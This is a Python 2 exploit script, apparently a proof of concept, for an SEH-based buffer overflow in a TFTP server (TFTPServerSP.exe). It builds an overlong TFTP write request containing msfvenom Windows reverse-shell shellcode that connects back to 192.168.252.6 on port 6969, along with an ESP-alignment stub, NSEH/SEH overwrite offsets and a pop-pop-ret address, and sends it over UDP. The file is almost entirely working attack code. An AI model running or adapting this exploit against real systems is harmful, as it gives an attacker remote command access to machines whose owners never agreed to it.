#!/usr/bin/env python
import sys, socket, struct, time
 
if len(sys.argv) <= 2:
    print "Usage: python " + sys.argv[0] + " [host] [port]"
    exit()
 
host = sys.argv[1]    
port = int(sys.argv[2])

# Shellcode
# msfvenom -p windows/shell_reverse_tcp lhost=192.168.252.6 lport=6969 -b '\x00\x0a\x0d\x2f' -v shellcode -f python
# Size 351 bytes
shellcode =  ""
shellcode += "\xd9\xc3\xd9\x74\x24\xf4\x5d\x33\xc9\xbb\x21\xa2"
shellcode += "\x2c\x51\xb1\x52\x31\x5d\x17\x83\xed\xfc\x03\x7c"
shellcode += "\xb1\xce\xa4\x82\x5d\x8c\x47\x7a\x9e\xf1\xce\x9f"
shellcode += "\xaf\x31\xb4\xd4\x80\x81\xbe\xb8\x2c\x69\x92\x28"
shellcode += "\xa6\x1f\x3b\x5f\x0f\x95\x1d\x6e\x90\x86\x5e\xf1"
shellcode += "\x12\xd5\xb2\xd1\x2b\x16\xc7\x10\x6b\x4b\x2a\x40"
shellcode += "\x24\x07\x99\x74\x41\x5d\x22\xff\x19\x73\x22\x1c"
shellcode += "\xe9\x72\x03\xb3\x61\x2d\x83\x32\xa5\x45\x8a\x2c"
shellcode += "\xaa\x60\x44\xc7\x18\x1e\x57\x01\x51\xdf\xf4\x6c"
shellcode += "\x5d\x12\x04\xa9\x5a\xcd\x73\xc3\x98\x70\x84\x10"
shellcode += "\xe2\xae\x01\x82\x44\x24\xb1\x6e\x74\xe9\x24\xe5"
shellcode += "\x7a\x46\x22\xa1\x9e\x59\xe7\xda\x9b\xd2\x06\x0c"
shellcode += "\x2a\xa0\x2c\x88\x76\x72\x4c\x89\xd2\xd5\x71\xc9"
shellcode += "\xbc\x8a\xd7\x82\x51\xde\x65\xc9\x3d\x13\x44\xf1"
shellcode += "\xbd\x3b\xdf\x82\x8f\xe4\x4b\x0c\xbc\x6d\x52\xcb"
shellcode += "\xc3\x47\x22\x43\x3a\x68\x53\x4a\xf9\x3c\x03\xe4"
shellcode += "\x28\x3d\xc8\xf4\xd5\xe8\x5f\xa4\x79\x43\x20\x14"
shellcode += "\x3a\x33\xc8\x7e\xb5\x6c\xe8\x81\x1f\x05\x83\x78"
shellcode += "\xc8\xea\xfc\x7e\x0e\x83\xfe\x7e\x14\x6a\x76\x98"
shellcode += "\x40\x9c\xde\x33\xfd\x05\x7b\xcf\x9c\xca\x51\xaa"
shellcode += "\x9f\x41\x56\x4b\x51\xa2\x13\x5f\x06\x42\x6e\x3d"
shellcode += "\x81\x5d\x44\x29\x4d\xcf\x03\xa9\x18\xec\x9b\xfe"
shellcode += "\x4d\xc2\xd5\x6a\x60\x7d\x4c\x88\x79\x1b\xb7\x08"
shellcode += "\xa6\xd8\x36\x91\x2b\x64\x1d\x81\xf5\x65\x19\xf5"
shellcode += "\xa9\x33\xf7\xa3\x0f\xea\xb9\x1d\xc6\x41\x10\xc9"
shellcode += "\x9f\xa9\xa3\x8f\x9f\xe7\x55\x6f\x11\x5e\x20\x90"
shellcode += "\x9e\x36\xa4\xe9\xc2\xa6\x4b\x20\x47\xd6\x01\x68"
shellcode += "\xee\x7f\xcc\xf9\xb2\x1d\xef\xd4\xf1\x1b\x6c\xdc"
shellcode += "\x89\xdf\x6c\x95\x8c\xa4\x2a\x46\xfd\xb5\xde\x68"
shellcode += "\x52\xb5\xca"

# Align ESP
# ESP = 0x00bef38a, buffer = 0x00befbec. Buffer - ESP = 0x862
align_esp = (    "\x54"                          # PUSH ESP
                 "\x58"                          # POP EAX
                 "\x66\x05\x52\x08"              # ADD AX, 0x852
                 "\x50"                          # PUSH EAX
                 "\x5c"                          # POP ESP
            )

# Maximum length
maxlen = 7000

# Offsets
crash_nseh = 1246
crash_seh = crash_nseh + 4
ret_nseh_jmp = 1154
ret_s2_jmp = 936

# NOP's
nop = "\x90" * 16

# Variables
prefix = "A" * 230
prefix += align_esp
prefix += nop
prefix += shellcode
prefix += "B" * (ret_nseh_jmp - len(prefix))
prefix += "\xe9\x5f\xfc\xff\xff"                            # JMP 0xfffffc64
prefix += "C" * (crash_nseh - len(prefix))
nseh = "\x4c\x4c\x77\xa0"                                   # DEC ESP # DEC ESP # JA SHORT
seh = struct.pack("<L", 0x00411b7c)                         # SEH PPR # TFTPServerSP.exe
suffix = "D" * (maxlen - len(prefix + nseh + seh))

# Crafting payload
payload = prefix + nseh + seh + suffix

print "[+] Connecting to " + host + "\n"

try:
        req = (
                "\x00\x02" +
                payload +
                "\0netascii\0"
        )
    
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect((host, port))
        s.send(req)
        s.recv(1024)
        s.close()

        time.sleep(0.5)
    
except Exception,e:
        print "[!] Error occured: " + str(e)
        print "[*] Crashed occured at buffer length: " + str(len(payload))
        sys.exit()

